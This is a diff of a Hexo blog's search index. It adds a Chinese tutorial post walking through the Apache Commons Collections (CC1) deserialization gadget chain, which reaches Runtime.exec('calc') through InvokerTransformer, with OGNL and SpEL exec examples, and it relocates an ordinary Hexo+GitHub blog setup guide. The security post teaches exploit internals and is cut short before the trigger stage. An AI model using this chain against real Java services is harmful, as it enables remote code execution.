@@ -1,6 +1,118 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>CC1</title>
+    <url>/2023/03/15/CC1/</url>
+    <content><![CDATA[<h3 id="Payload构造"><a href="#Payload构造" class="headerlink" title="Payload构造"></a>Payload构造</h3><p>Apache Commons 当中有⼀个组件叫做 Apache Commons Collections ，主要封装了Java 的 Collection(集合) 相关类对象，它提供了很多强有⼒的数据结构类型并且实现了各种集合工具类。</p>
+<p> <strong>Apache Commons Collections中有⼀个特殊的接口，其中有⼀个实现该接口的类可以通过调用 Java的反射机制来调用任意函数，叫做InvokerTransformer</strong></p>
+<p>好的，现在让我们聚焦到Commons Collections内部，看看前辈们是如何利用它来让应用『产生』问题的。</p>
+<p>我们先预备一个基本知识，在Java中，若想通过其原生JDK提供的接口执行系统命令，最常见的语句如下：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Runtime</span> <span class="variable">rt</span> <span class="operator">=</span> Runtime.getRuntime();</span><br><span class="line">rt.exec(cmd);</span><br></pre></td></tr></table></figure>
+
+<p>很简单，一个单例模式的方法获取到<code>Runtime</code>的实例，再调用它的<code>exec()</code>执行命令。在表达式注入类RCE漏洞中也可以频繁看到利用各种条件特性来构造这段语句的身影，比如Struts2的OGNL：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@java</span>.lang.Runtime<span class="meta">@getRuntime()</span>.exec(cmd)</span><br></pre></td></tr></table></figure>
+
+<p>比如Spring的SpEL：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">T(java.lang.Runtime).getRuntime().exec(cmd)</span><br></pre></td></tr></table></figure>
+
+<p>这里替小白问个基础但又和接下来的内容有关的问题：为什么都要使用链式结构？</p>
+<p>原因其实很简单，因为无论是表达式解析执行还是反序列化时，底层通过反射技术获取对象调用函数都会存在一个上下文环境，使用链式结构的语句可以保证执行过程中这个上下文是一致的。你也可以换个方式问自己，如果你第一次请求<code>Runtime.getRuntime()</code>，那如何保证第二次请求<code>rt.exec()</code>能够拿到第一次的<code>Runtime</code>对象呢？</p>
+<p>了解了这个问题之后，我们就可以开始尝试用Commons Collections先来构造这个链式结构了。</p>
+<p>在开始之前先写一个简单的例子</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Transformer[] trans = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">chain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(trans);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">      chain.transform(<span class="string">&quot;test&quot;</span>); <span class="comment">//设置断点，进行调试</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>前辈们为我们在Commons Collections中找到了一个用于对象之间转换的<code>Transformer</code>接口，它有几个我们用得着的实现类：</p>
+<ol>
+<li><p><code>ConstantTransformer</code></p>
+<p>ConstantTransformer，调用该类的transform方法返回传入对象本身。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;   </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>InvokerTransformer</code></p>
+<p>InvokerTransformer，其transform方法能通过invoke执行输入的对象。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;    </span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();    </span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);  </span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);    &#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>ChainedTransformer</code></p>
+<p>它的transform方法能调用链中所有的transform方法，并且将前一个transform的输出作为当前transform的输入</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;   </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;  </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">     object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+</ol>
+<p>其中，数组的中间两个元素是最让人费解的，我们一句一句来解释 <em>（前方高能预警，请对照上面几个<code>Transformer</code>的逻辑仔细看，接下来的内容网上有些解释是存在出入的）</em> ：</p>
+<ol>
+<li>构造一个<code>ConstantTransformer</code>，把<code>Runtime</code>的<code>Class</code>对象传进去，在<code>transform()</code>时，始终会返回这个对象</li>
+<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>getMethod</code>，参数为<code>getRuntime</code>，在<code>transform()</code>时，传入1的结果，此时的<code>input</code>应该是<code>java.lang.Runtime</code>，但经过<code>getClass()</code>之后，<code>cls</code>为<code>java.lang.Class</code>，之后<code>getMethod()</code>只能获取<code>java.lang.Class</code>的方法，因此才会定义的待调用方法名为<code>getMethod</code>，然后其参数才是<code>getRuntime</code>，它得到的是<code>getMethod</code>这个方法的<code>Method</code>对象，<code>invoke()</code>调用这个方法，最终得到的才是<code>getRuntime</code>这个方法的<code>Method</code>对象</li>
+<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>invoke</code>，参数为空，在<code>transform()</code>时，传入2的结果，同理，<code>cls</code>将会是<code>java.lang.reflect.Method</code>，再获取并调用它的<code>invoke</code>方法，实际上是调用上面的<code>getRuntime()</code>拿到<code>Runtime</code>对象</li>
+<li>构造一个<code>InvokerTransformer</code>，待调用方法名为<code>exec</code>，参数为命令字符串，在<code>transform()</code>时，传入3的结果，获取<code>java.lang.Runtime</code>的<code>exec</code>方法并传参调用</li>
+<li>最后把它们组装成一个数组全部放进<code>ChainedTransformer</code>中，在<code>transform()</code>时，会将前一个元素的返回结果作为下一个的参数，刚好满足需求</li>
+</ol>
+<h2 id="从触发点开始分析"><a href="#从触发点开始分析" class="headerlink" title="从触发点开始分析"></a>从触发点开始分析</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">chain.transform(<span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>由于chain是new ChainedTransformer(trans);</p>
+<p>所以进入ChainedTransformer，它的transform方法能调用链中所有的transform方法，并且将前一个transform的输出作为当前transform的输入</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;   </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iTransformers = transformers;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;  </span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">     object = iTransformers[i].transform(object);</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此时iTransformers是transform[]</p>
+<p>然后对transform[] 进行一个遍历 从我们自己输入的顺序开始</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">iTransformers[<span class="number">0</span>] ==ConstantTransformer</span><br></pre></td></tr></table></figure>
+
+<p>进入ConstantTransformer方法，调用该类的transform方法返回传入对象本身。</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;   </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iConstant = constantToReturn;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;    <span class="keyword">return</span> iConstant;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于我们传入第一个的class是Runtime.class，所以iConstant&#x3D;&#x3D;Runtime.class &#x3D;&#x3D; object 一个类</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">iTransformers[<span class="number">1</span>] ==InvokerTransformer</span><br></pre></td></tr></table></figure>
+
+<p>InvokerTransformer，其transform方法能通过invoke执行输入的对象。</p>
+<p>我们传入的第二个class </p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;),</span><br><span class="line"></span><br><span class="line">iMethodName =<span class="string">&quot;getMethod&quot;</span></span><br><span class="line">iParamTypes = Class[]&#123;String.class, Class[].class&#125;;</span><br><span class="line">iArgs = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;  </span><br><span class="line">    <span class="built_in">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;  </span><br><span class="line">   <span class="comment">// input:&quot;class java.lang.Runtime&quot; </span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass(); </span><br><span class="line">   <span class="comment">// 通过对第一个的分析此时的  cls== &quot;java.lang.Class&quot;</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes); </span><br><span class="line">    <span class="comment">//Method method = cls.getMethod(&quot;getMethod&quot;, Class[]&#123;String.class, Class[].class&#125;); </span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs); </span><br><span class="line">    <span class="comment">//invoke(Object obj, Object... args) 是method 类中的方法，这个方法是一个native 方法</span></span><br><span class="line">    <span class="comment">//input:&quot;class java.lang.Runtime &quot; </span></span><br><span class="line">    <span class="comment">//iArgs = new Object[]&#123;&quot;getRuntime&quot;, new Class[0]&#125;);</span></span><br><span class="line">    <span class="comment">//method &quot;public java.lang.reflect.Method java.lang.Class.getMethod(java.lang.String,java.lang.Class[])    throws java.lang.NoSuchMethodException,java.lang.SecurityException&quot;</span></span><br><span class="line">  </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>此时object&#x3D;&#x3D;  java.lang.Runtime.getRuntime() 一个类</p>
+<p>继续进入InvokerTransformer</p>
+<p>我们传入的第三个class </p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">iTransformers[<span class="number">2</span>] ==InvokerTransformer</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,</span><br><span class="line">                   <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                   <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;),</span><br><span class="line"></span><br><span class="line">iMethodName =<span class="string">&quot;invoke&quot;</span></span><br><span class="line">iParamTypes = Class[]&#123;String.class, Class[].class&#125;;</span><br><span class="line">iArgs = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;null&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;);</span><br></pre></td></tr></table></figure>
+
+<p>经过如下变换</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">input:<span class="string">&quot;class java.lang.Runtime.getRuntime()&quot;</span> </span><br><span class="line">cls==<span class="keyword">class</span> <span class="title class_">java</span>.lang.reflect.Method</span><br><span class="line">Object==Runtime <span class="comment">//一个实例化对象</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">iTransformers[<span class="number">3</span>] ==InvokerTransformer</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<p>既然第2、3步这么绕，我们又知道了为什么，是不是可以考虑用下面这种逻辑更清晰的方式来构造呢：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Transformer[] trans = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;      </span><br><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),  </span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getRuntime&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>], <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]),      </span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[] &#123; String.class &#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123; cmd &#125;)&#125;;</span><br></pre></td></tr></table></figure>
+
+<p>答案是不行的。虽然单看整个链，无论是定义还是执行都是没有任何问题的，但是在后续序列化时，由于<code>Runtime.getRuntime()</code>得到的是一个对象，这个对象也需要参与序列化过程，而<code>Runtime</code>本身是没有实现<code>Serializable</code>接口的，所以会导致序列化失败。</p>
+<p>也有同学可能看过ysoserial构造的Payload，它的习惯是先定义一个包含『无效』<code>Transformer</code>的<code>ChainedTransformer</code>，等所有对象装填完毕之后再利用反射将实际的数组放进去。这么做的原因作者也在一个Issue中给了解释，我们直接看原文：</p>
+]]></content>
+  </entry>
+  <entry>
     <title>JWT</title>
     <url>/2023/03/14/JWT/</url>
     <content><![CDATA[<h2 id="1-JSON-Web-Token是什么"><a href="#1-JSON-Web-Token是什么" class="headerlink" title="1. JSON Web Token是什么"></a>1. JSON Web Token是什么</h2><p>JSON Web Token (JWT)是一个开放标准(RFC 7519)，它定义了一种紧凑的、自包含的方式，用于作为JSON对象在各方之间安全地传输信息。该信息可以被验证和信任，因为它是数字签名的。</p>
@@ -136,6 +248,141 @@
       </categories>
       <tags>
         <tag>JWT</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>hexo+github搭建博客</title>
+    <url>/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><ol>
+<li>GitHub账号<br>需要有一个GitHub账号，没有的话到 官网 申请一个。<br>注册很简单，不懂的话可以参考 GitHub申请账号</li>
+<li>安装Git<br> 在自己电脑上安装好Git，hexo部署到GitHub时要用。<br> 网上找篇教程</li>
+<li>安装NodeJS<br>在自己电脑上安装好NodeJS，Hexo是基于NodeJS编写的，所以需要安装NodeJS和npm工具。<br>网上找篇教程</li>
+</ol>
+<h1 id="安装Hexo"><a href="#安装Hexo" class="headerlink" title="安装Hexo"></a>安装Hexo</h1><p>我们采用Hexo来创建我们的博客网站，Hexo 是一个基于NodeJS的静态博客网站生成器，使用Hexo不需开发，只要进行一些必要的配置即可生成一个个性化的博客网站，非常方便。点击进入 官网。</p>
+<p>安装 Hexo</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install -g hexo-cli</span><br></pre></td></tr></table></figure>
+
+<p>查看版本</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo -v</span><br></pre></td></tr></table></figure>
+
+<p>创建一个项目 hexo-blog 并初始化</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo init hexo-blog</span><br><span class="line"><span class="built_in">cd</span> hexo-blog</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure>
+
+<p>本地启动</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo g</span><br><span class="line">hexo server</span><br></pre></td></tr></table></figure>
+
+
+<p>浏览器访问 <a href="http://localhost:4000，页面默认主图风格如下">http://localhost:4000，页面默认主图风格如下</a></p>
+<img src="/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/image-20230313232222727.png" class="" title="image-20230313232222727">
+
+
+
+
+
+<h1 id="创建仓库"><a href="#创建仓库" class="headerlink" title="创建仓库"></a>创建仓库</h1><p>在<code>GitHub</code>上创建一个新的代码仓库用于保存我们的网页。</p>
+<p>点击<code>Your repositories</code>，进入仓库页面。</p>
+<p>点击<code>New</code>按钮，进入仓库创建页面。</p>
+<p>填写仓库名，格式必须为<code>&lt;用户名&gt;.github.io</code>，然后点击<code>Create repository</code>。</p>
+<p>点击<code>creating a new file</code>创建一个新文件，作为我们网站的主页。</p>
+<h1 id="ssh连接"><a href="#ssh连接" class="headerlink" title="ssh连接"></a>ssh连接</h1><p>4.1生成SSH添加到GitHub</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;yourname&quot;</span></span><br><span class="line">git config --global user.email <span class="string">&quot;youremail&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这里的yourname输入你的GitHub用户名，youremail输入你GitHub的邮箱。这样GitHub才能知道你是不是对应它的账户。</p>
+<p>可以用以下两条，检查一下你有没有输对</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config user.name</span><br><span class="line">git config user.email</span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后创建SSH,一路回车</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh-keygen -t rsa -C <span class="string">&quot;youremail&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>在gitbash中，查看是否成功</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
+
+
+
+<p>如果失败更改端口</p>
+<p>操作方法：</p>
+<p>进入~&#x2F;.ssh下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure>
+
+
+<p>创建一个config文件(这里我用的vim编辑器)</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim config</span><br></pre></td></tr></table></figure>
+
+
+<p>编辑文件内容：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">User git</span><br><span class="line">Hostname ssh.github.com</span><br><span class="line">PreferredAuthentications publickey</span><br><span class="line">IdentityFile ~/.ssh/id_rsa</span><br><span class="line">Port 443</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>保存退出<br>检查是否成功</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -T git@github.com</span><br></pre></td></tr></table></figure>
+
+<h1 id="将hexo部署到GitHub"><a href="#将hexo部署到GitHub" class="headerlink" title="将hexo部署到GitHub"></a>将hexo部署到GitHub</h1><p>这个时候需要先安装deploy-git ，也就是部署的命令,这样你才能用命令部署到GitHub。</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这一步，我们就可以将hexo和GitHub关联起来，也就是将hexo生成的文章部署到GitHub上，打开站点配置文件 _config.yml，翻到最后，修改为<br>YourgithubName就是你的GitHub账户</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  <span class="built_in">type</span>: git</span><br><span class="line">  repo: https://github.com/YourgithubName/YourgithubName.github.io.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>然后</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hexo clean</span><br><span class="line">hexo g</span><br><span class="line">hexo d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>若启动连接失败，输入以下命令</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git config --global --<span class="built_in">unset</span> http.proxy</span><br><span class="line">git config --global --<span class="built_in">unset</span> https.proxy</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h1 id="模板导入"><a href="#模板导入" class="headerlink" title="模板导入"></a>模板导入</h1><p>在hexo项目根目录下执行操作clone主题</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> -b master https://github.com/jerryc127/hexo-theme-butterfly.git themes/butterfly</span><br></pre></td></tr></table></figure>
+
+<p>如果沒有 pug 以及 <a href="https://so.csdn.net/so/search?q=stylus&spm=1001.2101.3001.7020">stylus</a> 的渲染器，还需要下载，否则在项目运行时会报错：</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-pug hexo-renderer-stylus --save</span><br></pre></td></tr></table></figure>
+
+<p>3、修改项目根目录下的_config.yml文件（称为站点配置文件），开启主题</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#theme: landscape</span></span><br><span class="line">theme: butterfly</span><br></pre></td></tr></table></figure>
+
+
+
+<p>若出现乱码</p>
+<p>原因是<a href="https://so.csdn.net/so/search?q=hexo&spm=1001.2101.3001.7020">hexo</a>在5.0之后把swig给删除了需要自己手动安装</p>
+<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">npm i hexo-renderer-swig</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h2 id="解决：hexo-github本地和线上图片不显示问题"><a href="#解决：hexo-github本地和线上图片不显示问题" class="headerlink" title="解决：hexo+github本地和线上图片不显示问题"></a>解决：hexo+github本地和线上图片不显示问题</h2><p>在搭载好hexo(butterfly)+github博客后（有道云笔记记录），新建博客无法图片问题，多方寻找网上的解决办法仍未解决，大多安装了hexo-asset-image插件来解决，但是本人多项测试后，均为无效，唯一有效的需要将图片格式转换为这样，但是以一个一个去转换非常麻烦，因此继续寻求解决办法，最终找到如下帖子：<a href="https://moeci.com/posts/hexo-typora/%EF%BC%8C%E8%BF%99%E4%BD%8D%E5%A4%A7%E4%BD%AC%E5%BC%80%E5%8F%91%E7%9A%84%E6%8F%92%E4%BB%B6%E6%98%AFhexo-asset-img%EF%BC%8C%E8%80%8C%E9%9D%9Ehexo-asset-image%EF%BC%8C%E7%BB%8F%E8%BF%87%E6%B5%8B%E8%AF%95%EF%BC%8C%E6%9C%89%E6%95%88">https://moeci.com/posts/hexo-typora/，这位大佬开发的插件是hexo-asset-img，而非hexo-asset-image，经过测试，有效</a></p>
+<p>1配置 <a href="https://so.csdn.net/so/search?q=Typora&spm=1001.2101.3001.7020">Typora</a> 偏好设置，如下图更改，此操作将图片文件保存路径: .&#x2F;${filename} 即保存到与 当前正在编辑的文件名相同的同级文件夹下。</p>
+<img src="/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/image-20230313233951219.png" class="" title="image-20230313233951219">
+
+
+
+<p>修改_config.yml中的post_asset_folder，false 改为 true，这样修改后，每次 ‘hexo new page’ 生成新文章，都会在文章文件同级目录创建一个与文章文件名同名的文件夹，我们就在这里存放此文章的图片。</p>
+<p>安装插件hexo-asset-img：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">npm install hexo-asset-img --save</span><br><span class="line">hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</span><br></pre></td></tr></table></figure>
+
+<p>完成安装</p>
+<h2 id="导航栏"><a href="#导航栏" class="headerlink" title="导航栏"></a>导航栏</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo new page <span class="string">&quot;about&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;tags&quot;</span></span><br><span class="line">hexo new page <span class="string">&quot;categories&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">---</span><br><span class="line">title: about</span><br><span class="line"><span class="built_in">date</span>: 2019-06-25 19:16:17</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;about&quot;</span></span><br><span class="line">---</span><br><span class="line"> </span><br><span class="line">---</span><br><span class="line">title: about</span><br><span class="line"><span class="built_in">date</span>: 2019-06-25 19:16:17</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;tags&quot;</span></span><br><span class="line">---</span><br><span class="line"> </span><br><span class="line">---</span><br><span class="line">title: about</span><br><span class="line"><span class="built_in">date</span>: 2019-06-25 19:16:17</span><br><span class="line"><span class="built_in">type</span>: <span class="string">&quot;categories&quot;</span></span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+<h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a><strong>常用命令</strong></h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">hexo new “name”       <span class="comment"># 新建文章</span></span><br><span class="line"></span><br><span class="line">hexo new page “name”  <span class="comment"># 新建页面</span></span><br><span class="line"></span><br><span class="line">hexo g                <span class="comment"># 生成页面</span></span><br><span class="line"></span><br><span class="line">hexo d                <span class="comment"># 部署</span></span><br><span class="line"></span><br><span class="line">hexo g -d             <span class="comment"># 生成页面并部署</span></span><br><span class="line"></span><br><span class="line">hexo s                <span class="comment"># 本地预览</span></span><br><span class="line"></span><br><span class="line">hexo clean            <span class="comment"># 清除缓存和已生成的静态文件</span></span><br><span class="line"></span><br><span class="line">hexo <span class="built_in">help</span>             <span class="comment"># 帮助</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+]]></content>
+      <categories>
+        <category>Others</category>
+      </categories>
+      <tags>
+        <tag>建站</tag>
       </tags>
   </entry>
   <entry>
@@ -353,141 +600,6 @@
       </categories>
       <tags>
         <tag>PHP反序列化</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>hexo+github搭建博客</title>
-    <url>/2023/03/13/hexo-github%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2/</url>
-    <content><![CDATA[<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><ol>
-<li>GitHub账号<br>需要有一个GitHub账号，没有的话到 官网 申请一个。<br>注册很简单，不懂的话可以参考 GitHub申请账号</li>
